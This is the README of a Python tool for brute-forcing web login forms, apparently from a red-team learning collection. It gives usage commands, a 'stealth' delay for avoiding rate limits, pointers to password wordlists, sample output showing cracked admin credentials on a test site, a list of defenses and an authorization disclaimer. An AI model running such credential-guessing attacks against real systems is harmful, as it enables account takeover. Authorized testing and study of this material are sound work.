# Web Login Bruteforce Tool

A flexible tool for brute forcing web-based login forms using HTTP POST or GET requests.

## Description

This tool automates the process of testing credentials against web login forms. It supports both single-username and multi-username brute force attacks, with customizable form fields, error/success message detection, and multi-threading for improved performance.

## Features

- Support for POST and GET login methods
- Single or multiple username attacks
- Multi-threaded for faster attacks
- Customizable form field names
- Error message detection
- Success message detection
- Configurable request delay (to avoid detection/rate limiting)
- Session handling for cookies
- Verbose mode for debugging
- Progress tracking

## Usage

### Single Username Attack

```bash
python3 web_login_bruteforcer.py -u admin -P passwords.txt -l http://example.com/login
```

### Multiple Usernames Attack

```bash
python3 web_login_bruteforcer.py -U usernames.txt -P passwords.txt -l http://example.com/login
```

### Custom Form Fields

```bash
python3 web_login_bruteforcer.py -u admin -P passwords.txt \
  -l http://example.com/login \
  --username-field email \
  --password-field passwd
```

### With Error Message Detection

```bash
python3 web_login_bruteforcer.py -u admin -P passwords.txt \
  -l http://example.com/login \
  -e "Invalid username or password"
```

### With Success Message Detection

```bash
python3 web_login_bruteforcer.py -u admin -P passwords.txt \
  -l http://example.com/login \
  -s "Welcome back"
```

### GET Method Login

```bash
python3 web_login_bruteforcer.py -u admin -P passwords.txt \
  -l http://example.com/login \
  -m GET
```

### With Delay (Stealth Mode)

```bash
python3 web_login_bruteforcer.py -u admin -P passwords.txt \
  -l http://example.com/login \
  -d 0.5 \
  -t 2
```

## Options

- `-l, --login-url` - Login page URL (required)
- `-u, --username` - Single username to test
- `-U, --username-list` - File containing usernames
- `-p, --password` - Single password to test
- `-P, --password-list` - File containing passwords
- `--username-field` - Username field name (default: username)
- `--password-field` - Password field name (default: password)
- `-m, --method` - HTTP method: POST or GET (default: POST)
- `-e, --error-message` - Error message indicating failed login
- `-s, --success-message` - Success message indicating successful login
- `-t, --threads` - Number of threads (default: 5)
- `-d, --delay` - Delay between requests in seconds (default: 0)
- `-v, --verbose` - Verbose output

## Example Output

```
$ python3 web_login_bruteforcer.py -u admin -P passwords.txt -l http://testphp.vulnweb.com/login.php

[*] Starting bruteforce for username: admin
[*] Testing 30 passwords...
------------------------------------------------------------
[+] SUCCESS! Valid credentials found:
[+] Username: admin
[+] Password: admin
[+] Attempts: 15
```

## How It Works

1. **Request Preparation**: Constructs HTTP POST/GET request with form data
2. **Session Management**: Maintains session for cookie handling
3. **Response Analysis**: Analyzes response for success/error indicators
4. **Detection Methods**:
   - Error message detection (checks if error message is NOT present)
   - Success message detection (checks if success message IS present)
   - Default heuristics (looks for common error keywords)
5. **Threading**: Distributes attempts across multiple threads for speed

## Finding Form Field Names

To find the correct form field names, inspect the HTML source of the login page:

```html
<form action="/login" method="post">
    <input type="text" name="username" />
    <input type="password" name="password" />
    <button type="submit">Login</button>
</form>
```

In this example:
- Username field: `username`
- Password field: `password`

Use browser developer tools (F12) to inspect the form or look for `<input>` tags with `name` attributes.

## Wordlists

The tool comes with a sample `passwords.txt` file. For more comprehensive wordlists, consider using:

- **SecLists**: https://github.com/danielmiessler/SecLists
- **RockYou**: Common password leak wordlist
- **Custom wordlists**: Based on target information

## Defense Against This Attack

As a defender, you can protect against brute force attacks by:

1. **Rate Limiting**: Limit login attempts per IP/username
2. **Account Lockout**: Temporarily lock accounts after failed attempts
3. **CAPTCHA**: Implement CAPTCHA after several failed attempts
4. **Strong Password Policy**: Enforce complex passwords
5. **Multi-Factor Authentication**: Require second factor
6. **Monitoring**: Alert on multiple failed login attempts
7. **IP Blocking**: Block IPs with suspicious activity

## Legal Disclaimer

**WARNING**: Brute forcing login forms without authorization is illegal.

Only use this tool on:
- Systems you own
- Applications you have explicit permission to test
- Authorized penetration testing engagements
- Intentionally vulnerable applications (DVWA, WebGoat, etc.)
- Bug bounty programs that allow brute force testing

## Requirements

- Python 3.x
- requests library

Install requirements:
```bash
pip3 install requests
```

## Limitations

- May not work with JavaScript-based login forms (React, Angular, etc.)
- Does not handle CSRF tokens automatically
- May trigger account lockouts or IP bans
- Performance depends on network latency and server response time
- WAF/IPS may detect and block the attack

## Author

Created as part of the 100 Red Team Projects collection.
